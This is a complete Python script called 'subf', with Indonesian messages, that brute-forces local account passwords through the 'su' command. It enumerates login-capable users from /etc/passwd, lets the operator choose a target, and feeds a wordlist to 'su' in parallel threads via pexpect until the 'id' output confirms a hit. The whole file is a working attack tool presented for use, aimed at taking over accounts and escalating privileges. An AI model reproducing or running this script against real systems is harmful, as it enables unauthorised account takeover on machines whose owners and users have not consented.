#!/usr/bin/env python3
import pexpect
import argparse
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

def try_password(user, password):
    try:
        child = pexpect.spawn(f"su {user} -c id", timeout=5)
        child.expect("Password:")
        child.sendline(password)
        index = child.expect([r"(uid=\d+.+)", "su: Authentication failure", pexpect.EOF, pexpect.TIMEOUT])
        if index == 0:
            result = child.match.group(1).decode(errors="ignore").strip()
            child.close()
            return (True, password, result)
        child.close()
        return (False, password, None)
    except Exception as e:
        return (False, password, f"Error: {str(e)}")

def print_header(tool_name, version, description):
    width = 50
    print("┌" + "─" * width + "┐")
    print(f"│ {tool_name} - v{version}")
    print(f"│ {description}")
    print("└" + "─" * width + "┘\n")

def get_login_users():
    """Ambil daftar user yang shell-nya bisa login (bukan nologin/false) dari /etc/passwd"""
    valid_shells = {
        '/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/bin/ksh',
        '/usr/bin/bash', '/usr/bin/zsh', '/usr/bin/sh', '/usr/local/bin/bash'
    }
    users = []
    try:
        with open("/etc/passwd", "r") as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) < 7:
                    continue
                username, shell = parts[0], parts[6]
                if shell in valid_shells:
                    users.append(username)
    except Exception as e:
        print(f"[ERROR] Gagal baca /etc/passwd: {e}")
    return users

def choose_user(users):
    print("Pilih user target dari daftar berikut:")
    for i, u in enumerate(users, 1):
        print(f"  [{i}] {u}")
    while True:
        choice = input(f"Masukkan nomor user (1-{len(users)}): ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(users):
                return users[idx-1]
        print("Input tidak valid. Coba lagi.")

def main():
    parser = argparse.ArgumentParser(description="subf: fast su brute-force with elegant UI")
    parser.add_argument("-u", "--user", help="Target username (jika tidak diisi, pilih dari /etc/passwd)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path ke wordlist")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Jumlah threads paralel (default: 5)")
    args = parser.parse_args()

    if not os.path.isfile(args.wordlist):
        print(f"[ERROR] Wordlist tidak ditemukan: {args.wordlist}")
        sys.exit(1)

    if args.user:
        user = args.user
    else:
        users = get_login_users()
        if not users:
            print("[ERROR] Tidak ditemukan user yang valid di /etc/passwd")
            sys.exit(1)
        user = choose_user(users)

    with open(args.wordlist, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print_header("Subf", "1.0", "Unlock & Brute-Force User Access Tool")
    print(f"[INFO] Target user   : {user}")
    print(f"[INFO] Total password: {len(passwords)}")
    print(f"[INFO] Threads      : {args.threads}")
    print("[INFO] Mulai proses brute-force...\n")

    found = False
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_pwd = {executor.submit(try_password, user, pwd): pwd for pwd in passwords}
        for i, future in enumerate(as_completed(future_to_pwd), 1):
            success, pwd, result = future.result()
            print(f"[{i:>4}/{len(passwords)}] Mencoba password: {pwd}     ", end="\r")
            if success:
                print("\n" + "-"*60)
                print(f"[SUCCESS] Password ditemukan untuk user '{user}': {pwd}")
                print(f"[RESULT]  {result}")
                print("-"*60)
                found = True
                break

    if not found:
        print("\n" + "-"*60)
        print("[FAILED] Tidak berhasil menemukan password.")
        print("-"*60)

if __name__ == "__main__":
    if sys.stdin.isatty():
        main()
    else:
        print("[-] Jalankan script ini di terminal (TTY).")